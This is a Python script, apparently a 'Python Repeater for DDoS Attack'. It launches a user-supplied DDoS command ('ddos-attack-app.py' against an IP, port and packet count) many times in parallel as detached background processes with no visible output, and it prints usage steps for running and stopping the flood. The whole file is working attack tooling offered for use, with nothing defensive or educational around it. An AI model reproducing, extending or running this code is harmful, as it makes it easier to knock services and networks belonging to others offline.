import subprocess
import time
import sys
import os
import multiprocessing 

def singleAttackProcess(commandStr):
    try:
        commandArgs = commandStr.split()
        print(f"  [Pool Worker PID {os.getpid()}] Launching: {' '.join(commandArgs[:2])}...") 
        process = subprocess.Popen(
            commandArgs,
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL, 
            stdin=subprocess.DEVNULL,  
            start_new_session=True     
        )
        print(f"  [Pool Worker PID {os.getpid()}] Child DDoS PID: {process.pid}")
        return process.pid 
    except FileNotFoundError:
        print(f"Error: Command '{commandArgs[0]}' not found. Make sure it's in your PATH or provide full path.")
        return None
    except PermissionError:
        print(f"Error: Permission denied. Do you have 'sudo' correctly configured or the right permissions?")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during launch: {e}")
        return None

def runBackground():
    outText = """
    =========================================
    Python Repeater for DDoS Attack (Multiprocessing Pool)
    =========================================
    1. Before running this repeater, it is better to move to Downloads folder 
       where DDoS located, like cd Downloads, then re-run this repeater.
    2. Run the repeater using: sudo python repeater.py
    3. Example output usage =>
        Enter the command: sudo python ddos-attack-app.py 192.168.8.40 80 200000
        Enter the number repeats: 50
        Enter the number of CONCURRENT attacks (max: x): 2
    To check requests, use: ps aux | grep 'ddos-attack-app.py'
    To stop requests, use: sudo pkill -9 -f ddos-attack-app.py || true ; reset
    """
    print(outText)
    repeatCommand = input("Enter the command: ")
    if not repeatCommand:
        print("Error: No command entered. Exiting.")
        sys.exit(1)
    try:
        numTimesString = input("Enter the number repeats: ")
        numTimes = int(numTimesString)
        if numTimes <= 0:
            raise ValueError
    except ValueError:
        print("Error: Invalid total repetitions. Please enter a positive integer.")
        sys.exit(1)
    try:
        maxCconcurrentProcesses = os.cpu_count() or 1 
        numConcurrentString = input(f"Enter the number of concurrent attacks (max: {maxCconcurrentProcesses}): ")
        numConcurrent = int(numConcurrentString)
        if numConcurrent <= 0:
            raise ValueError
    except ValueError:
        print("Error: Invalid number of concurrent attacks. Please enter a positive integer.")
        sys.exit(1)
    print("")
    print(f"Preparing to launch '{repeatCommand}' {numTimes} times with {numConcurrent} concurrent workers...")
    print("You might be prompted for your sudo password by each instance or once initially.")
    print("Output from the repeated commands will NOT appear in this terminal.")
    print("=========================================")
    print("")
    commandsToExecute = [repeatCommand] * numTimes
    launchedPids = []
    with multiprocessing.Pool(processes=numConcurrent) as pool:
        launchedPids = pool.map(singleAttackProcess, commandsToExecute)
    successfulPids = [pid for pid in launchedPids if pid is not None]
    print("\n" + "="*40)
    print(f"All {len(successfulPids)} instances have been launched in the background via the pool.")
    print("To check them, use: ps aux | grep 'ddos-attack-app.py'")
    print("To stop them, use: sudo pkill -9 -f ddos-attack-app.py || true ; reset")
    print("="*40 + "\n")
if __name__ == "__main__":
    runBackground()